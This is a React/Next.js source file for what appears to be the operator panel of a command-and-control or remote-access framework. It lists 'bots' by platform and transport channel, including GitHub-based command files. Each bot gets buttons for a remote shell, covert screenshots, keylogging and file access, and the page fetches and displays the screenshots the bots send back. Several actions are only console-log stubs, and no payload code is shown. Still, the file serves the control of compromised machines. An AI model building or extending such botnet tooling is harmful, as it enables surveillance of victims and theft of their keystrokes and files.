'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import PageLayout from '../components/PageLayout';
import LoadingScreen from '../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../utils/auth';

interface Agent {
  uuid: string;
  platform: string;
  transport_channel: string;
  status: string;
  created_at: string;
  commands_file: string;
  results_file: string;
  github_username?: string;
  github_repo?: string;
  last_seen?: string;
  capabilities?: string[];
}

export default function AgentsAndFleetPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [viewMode, setViewMode] = useState<'grid' | 'table'>('grid');
  const [searchQuery, setSearchQuery] = useState('');
  const [statusFilter, setStatusFilter] = useState('All Status');
  const [countryFilter, setCountryFilter] = useState('All Countries');
  const router = useRouter();

  // Mock agent data
  const [agents, setAgents] = useState<Agent[]>([]);
  const [loadingAgents, setLoadingAgents] = useState(false);
  const [screenshotModal, setScreenshotModal] = useState<{isOpen: boolean, botUuid: string, screenshotData: string | null}>({
    isOpen: false,
    botUuid: '',
    screenshotData: null
  });
  const [loadingScreenshot, setLoadingScreenshot] = useState(false);

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
  }, [router]);

  // Load agents from backend
  useEffect(() => {
    if (user) {
      loadAgents();
    }
  }, [user]);

  const loadAgents = async () => {
    setLoadingAgents(true);
    try {
      const response = await fetch(`http://localhost:5000/bots?username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          setAgents(result.bots || []);
        }
      }
    } catch (error) {
      console.error('Error loading agents:', error);
    } finally {
      setLoadingAgents(false);
    }
  };

  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  const handleBatchCommand = () => {
    console.log('Executing batch command on all agents');
  };

  const handleExportList = () => {
    console.log('Exporting agent list');
  };

  const handleAgentAction = async (agentUuid: string, action: string) => {
    if (action === 'screenshot') {
      await takeScreenshot(agentUuid);
    } else {
      console.log(`Executing ${action} on agent ${agentUuid}`);
    }
  };

  const takeScreenshot = async (botUuid: string) => {
    setLoadingScreenshot(true);
    try {
      // Send screenshot command to backend
      const response = await fetch('http://localhost:5000/screenshot', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_uuid: botUuid,
          username: user?.username || 'admin'
        }),
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          // Wait a moment for the bot to execute the command
          await new Promise(resolve => setTimeout(resolve, 3000));
          
          // Get the results
          await getScreenshotResults(botUuid);
        } else {
          alert(`Error: ${result.message}`);
        }
      } else {
        alert('Failed to send screenshot command');
      }
    } catch (error) {
      console.error('Error taking screenshot:', error);
      alert('Error taking screenshot');
    } finally {
      setLoadingScreenshot(false);
    }
  };

  const getScreenshotResults = async (botUuid: string) => {
    try {
      const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${botUuid}&username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success' && result.results) {
          // Check if the result contains base64 image data
          const results = result.results.trim();
          if (results && results.length > 100) { // Base64 images are typically long
            setScreenshotModal({
              isOpen: true,
              botUuid: botUuid,
              screenshotData: results
            });
          } else {
            alert('No screenshot data received. The bot may not be online or may have encountered an error.');
          }
        } else {
          alert('No screenshot results available');
        }
      } else {
        alert('Failed to get screenshot results');
      }
    } catch (error) {
      console.error('Error getting screenshot results:', error);
      alert('Error getting screenshot results');
    }
  };

  const accessShell = (agentUuid: string) => {
    window.open(`/shell/${agentUuid}`, '_blank');
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'online':
        return 'bg-green-400';
      case 'offline':
        return 'bg-red-400';
      case 'sleeping':
        return 'bg-yellow-400';
      default:
        return 'bg-gray-400';
    }
  };

  const filteredAgents = agents.filter(agent => {
    const matchesSearch = agent.uuid.toLowerCase().includes(searchQuery.toLowerCase()) ||
                         agent.platform.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesStatus = statusFilter === 'All Status' || agent.status === statusFilter.toLowerCase();
    const matchesPlatform = countryFilter === 'All Countries' || agent.platform === countryFilter;
    
    return matchesSearch && matchesStatus && matchesPlatform;
  });

  if (loading) {
    return <LoadingScreen message="Loading Agents & Fleet..." />;
  }

  if (!user) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="agentsandfleet" onLogout={handleLogout}>
      {/* Main Content Area */}
      <main className="flex-1 p-6 bg-gray-950 overflow-auto">
        {/* Page Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 className="text-4xl font-mono font-bold text-green-400">Agents & Fleet Management</h1>
          
          {/* Action Buttons */}
          <div className="flex items-center space-x-3">
            <button
              onClick={handleBatchCommand}
              className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg font-mono text-sm font-semibold transition-colors"
            >
              BATCH COMMAND
            </button>
            <button
              onClick={handleExportList}
              className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-mono text-sm transition-colors"
            >
              EXPORT LIST
            </button>
          </div>
        </div>

        {/* Filters and Search */}
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center space-x-4">
            {/* Search */}
            <div className="relative">
              <input
                type="text"
                placeholder="Search agents..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="bg-gray-800 border border-gray-600 rounded-lg px-4 py-2 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 font-mono text-sm w-64"
              />
            </div>

            {/* Status Filter */}
            <select
              value={statusFilter}
              onChange={(e) => setStatusFilter(e.target.value)}
              className="bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
            >
              <option>All Status</option>
              <option>online</option>
              <option>offline</option>
              <option>sleeping</option>
            </select>

            {/* Platform Filter */}
            <select
              value={countryFilter}
              onChange={(e) => setCountryFilter(e.target.value)}
              className="bg-gray-800 border border-gray-600 rounded-lg px-3 py-2 text-white font-mono text-sm focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
            >
              <option>All Platforms</option>
              <option>windows</option>
              <option>linux</option>
              <option>macos</option>
              <option>android</option>
            </select>
          </div>

          {/* View Toggle */}
          <div className="flex items-center space-x-2">
            <button
              onClick={() => setViewMode('grid')}
              className={`px-4 py-2 rounded-lg font-mono text-sm font-semibold transition-all duration-200 ${
                viewMode === 'grid'
                  ? 'bg-green-600 text-white'
                  : 'bg-gray-700 text-gray-300 hover:bg-gray-600 hover:text-white'
              }`}
            >
              GRID
            </button>
            <button
              onClick={() => setViewMode('table')}
              className={`px-4 py-2 rounded-lg font-mono text-sm font-semibold transition-all duration-200 ${
                viewMode === 'table'
                  ? 'bg-green-600 text-white'
                  : 'bg-gray-700 text-gray-300 hover:bg-gray-600 hover:text-white'
              }`}
            >
              TABLE
            </button>
          </div>
        </div>

        {/* Agents Display */}
        {loadingAgents ? (
          <div className="text-center py-12">
            <div className="text-gray-400 text-lg font-mono">Loading agents...</div>
          </div>
        ) : viewMode === 'grid' ? (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            {filteredAgents.map((agent) => (
              <div key={agent.uuid} className="bg-gray-900 rounded-lg p-6 border border-gray-700 hover:border-green-500 transition-all duration-200">
                {/* Agent Header */}
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-xl font-mono font-bold text-green-400">{agent.uuid}</h3>
                  <div className={`w-3 h-3 rounded-full ${getStatusColor(agent.status)}`}></div>
                </div>

                {/* Agent Details */}
                <div className="space-y-2 mb-6">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Platform:</span>
                    <span className="text-white font-mono capitalize">{agent.platform}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Transport:</span>
                    <span className="text-white font-mono capitalize">{agent.transport_channel}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Status:</span>
                    <span className="text-white font-mono capitalize">{agent.status}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Created:</span>
                    <span className="text-white font-mono">{new Date(agent.created_at).toLocaleDateString()}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Last Seen:</span>
                    <span className="text-white font-mono">{agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never'}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-400 font-mono">Files:</span>
                    <span className="text-white font-mono text-xs">{agent.commands_file.split('/')[1]}</span>
                  </div>
                </div>

                {/* Action Buttons */}
                <div className="grid grid-cols-2 gap-2">
                  <button
                    onClick={() => accessShell(agent.uuid)}
                    className="bg-green-600 hover:bg-green-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                  >
                    🖥️ Shell
                  </button>
                  <button
                    onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
                    disabled={loadingScreenshot}
                    className={`px-3 py-2 rounded font-mono text-xs transition-colors ${
                      loadingScreenshot 
                        ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
                        : 'bg-blue-600 hover:bg-blue-700 text-white'
                    }`}
                  >
                    {loadingScreenshot ? '⏳ Capturing...' : '📸 Screenshot'}
                  </button>
                  <button
                    onClick={() => handleAgentAction(agent.uuid, 'keylog')}
                    className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                  >
                    ⌨️ Keylog
                  </button>
                  <button
                    onClick={() => handleAgentAction(agent.uuid, 'fileaccess')}
                    className="bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded font-mono text-xs transition-colors"
                  >
                    📁 Files
                  </button>
                </div>
              </div>
            ))}
          </div>
        ) : (
          <div className="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
            <table className="w-full">
              <thead className="bg-gray-800">
                <tr>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Agent UUID</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Status</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Platform</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Transport</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Created</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Last Seen</th>
                  <th className="px-6 py-3 text-left text-xs font-mono font-medium text-gray-300 uppercase tracking-wider">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-700">
                {filteredAgents.map((agent) => (
                  <tr key={agent.uuid} className="hover:bg-gray-800">
                    <td className="px-6 py-4 whitespace-nowrap">
                      <span className="text-green-400 font-mono font-semibold text-xs">{agent.uuid}</span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="flex items-center">
                        <div className={`w-2 h-2 rounded-full ${getStatusColor(agent.status)} mr-2`}></div>
                        <span className="text-sm font-mono capitalize">{agent.status}</span>
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white capitalize">{agent.platform}</td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white capitalize">{agent.transport_channel}</td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{new Date(agent.created_at).toLocaleDateString()}</td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm font-mono text-white">{agent.last_seen ? new Date(agent.last_seen).toLocaleString() : 'Never'}</td>
                    <td className="px-6 py-4 whitespace-nowrap">
                      <div className="flex space-x-1">
                        <button
                          onClick={() => accessShell(agent.uuid)}
                          className="bg-green-600 hover:bg-green-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                        >
                          🖥️
                        </button>
                        <button
                          onClick={() => handleAgentAction(agent.uuid, 'screenshot')}
                          disabled={loadingScreenshot}
                          className={`px-2 py-1 rounded text-xs font-mono transition-colors ${
                            loadingScreenshot 
                              ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
                              : 'bg-blue-600 hover:bg-blue-700 text-white'
                          }`}
                        >
                          {loadingScreenshot ? '⏳' : '📸'}
                        </button>
                        <button
                          onClick={() => handleAgentAction(agent.uuid, 'keylog')}
                          className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                        >
                          ⌨️
                        </button>
                        <button
                          onClick={() => handleAgentAction(agent.uuid, 'fileaccess')}
                          className="bg-blue-600 hover:bg-blue-700 text-white px-2 py-1 rounded text-xs font-mono transition-colors"
                        >
                          📁
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* No Results */}
        {filteredAgents.length === 0 && (
          <div className="text-center py-12">
            <div className="text-gray-400 text-lg font-mono">No agents found matching your criteria</div>
            <div className="text-gray-500 text-sm font-mono mt-2">Try adjusting your search or filters</div>
          </div>
        )}

        {/* Screenshot Modal */}
        {screenshotModal.isOpen && (
          <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50">
            <div className="bg-gray-900 rounded-lg p-6 max-w-4xl max-h-[90vh] overflow-auto border border-gray-700">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-xl font-mono font-bold text-green-400">
                  Screenshot - {screenshotModal.botUuid}
                </h3>
                <button
                  onClick={() => setScreenshotModal({isOpen: false, botUuid: '', screenshotData: null})}
                  className="text-gray-400 hover:text-white text-2xl font-bold"
                >
                  ×
                </button>
              </div>
              
              {screenshotModal.screenshotData ? (
                <div className="space-y-4">
                  <img
                    src={`data:image/png;base64,${screenshotModal.screenshotData}`}
                    alt="Screenshot"
                    className="max-w-full h-auto border border-gray-600 rounded"
                  />
                  <div className="flex justify-between items-center">
                    <span className="text-gray-400 font-mono text-sm">
                      Captured at: {new Date().toLocaleString()}
                    </span>
                    <div className="space-x-2">
                      <button
                        onClick={() => {
                          try {
                            // Create a blob from the base64 data
                            const byteCharacters = atob(screenshotModal.screenshotData!);
                            const byteNumbers = new Array(byteCharacters.length);
                            for (let i = 0; i < byteCharacters.length; i++) {
                              byteNumbers[i] = byteCharacters.charCodeAt(i);
                            }
                            const byteArray = new Uint8Array(byteNumbers);
                            const blob = new Blob([byteArray], { type: 'image/png' });
                            
                            // Create download link
                            const url = window.URL.createObjectURL(blob);
                            const link = document.createElement('a');
                            link.href = url;
                            link.download = `screenshot-${screenshotModal.botUuid}-${Date.now()}.png`;
                            document.body.appendChild(link);
                            link.click();
                            document.body.removeChild(link);
                            window.URL.revokeObjectURL(url);
                          } catch (error) {
                            console.error('Download failed:', error);
                            alert('Download failed. Please try again.');
                          }
                        }}
                        className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                      >
                        Download
                      </button>
                      <button
                        onClick={() => setScreenshotModal({isOpen: false, botUuid: '', screenshotData: null})}
                        className="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                      >
                        Close
                      </button>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="text-center py-8">
                  <div className="text-gray-400 font-mono">No screenshot data available</div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Loading Overlay for Screenshot */}
        {loadingScreenshot && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-40">
            <div className="bg-gray-900 rounded-lg p-6 border border-gray-700">
              <div className="text-center">
                <div className="text-green-400 font-mono text-lg mb-2">Taking Screenshot...</div>
                <div className="text-gray-400 font-mono text-sm">Please wait while the bot captures the screen</div>
              </div>
            </div>
          </div>
        )}
      </main>
    </PageLayout>
  );
}
